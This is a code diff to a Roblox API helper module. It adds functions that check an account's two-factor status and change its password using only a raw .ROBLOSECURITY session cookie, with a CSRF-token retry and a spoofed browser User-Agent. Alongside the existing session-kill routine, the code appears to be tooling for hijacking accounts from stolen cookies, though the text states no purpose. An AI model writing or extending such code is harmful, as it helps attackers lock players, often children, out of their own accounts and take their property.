@@ -1,4 +1,3 @@
-// src/lib/roblox-api.ts
 import axios from 'axios';
 import { CookieJar } from 'tough-cookie';
 import { wrapper } from 'axios-cookiejar-support';
@@ -312,6 +311,73 @@ export async function killAndRefreshSession(cookie: string): Promise<{ success: 
     return { success: true, newCookie };
   } catch (err: any) {
     return { success: false, newCookie: null, error: err.message };
+  }
+}
+
+export async function checkTwoFactorStatus(cookie: string, userId: string): Promise<{ enabled: boolean; mediaType: string | null }> {
+  try {
+    const resp = await fetch(`https://www.roblox.com/v1/users/${userId}/configuration`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+    });
+    if (resp.status === 200) {
+      const data = (await resp.json()) as { primaryMediaType: string; methods: { mediaType: string; enabled: boolean }[] };
+      const authMethod = data.methods.find(m => m.mediaType === 'Authenticator');
+      return {
+        enabled: authMethod ? authMethod.enabled : false,
+        mediaType: data.primaryMediaType || null,
+      };
+    }
+  } catch {}
+  return { enabled: false, mediaType: null };
+}
+
+export async function changePassword(
+  cookie: string,
+  currentPassword: string,
+  newPassword: string
+): Promise<{ success: boolean; error?: string }> {
+  try {
+    const session = await (async () => {
+      const jar = new CookieJar();
+      await jar.setCookie(`.ROBLOSECURITY=${cookie.trim()}; Domain=.roblox.com; Path=/`, 'https://auth.roblox.com');
+      return wrapper(axios.create({ jar }));
+    })();
+
+    const baseHeaders = {
+      'Content-Type': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    };
+
+    const url = 'https://auth.roblox.com/v1/user/passwords/change';
+    const payload = { currentPassword, newPassword };
+
+    let resp = await session.post(url, payload, {
+      headers: baseHeaders,
+      validateStatus: () => true,
+      timeout: AXIOS_TIMEOUT,
+    });
+
+    if (resp.status === 403 && resp.headers['x-csrf-token']) {
+      const csrf = resp.headers['x-csrf-token'];
+      resp = await session.post(url, payload, {
+        headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf },
+        validateStatus: () => true,
+        timeout: AXIOS_TIMEOUT,
+      });
+    }
+
+    if (resp.status === 200) {
+      return { success: true };
+    }
+
+    let errorMsg = `HTTP ${resp.status}`;
+    try {
+      const json = resp.data;
+      if (json && json.message) errorMsg = json.message;
+    } catch {}
+    return { success: false, error: errorMsg };
+  } catch (err: any) {
+    return { success: false, error: err.message };
   }
 }
 
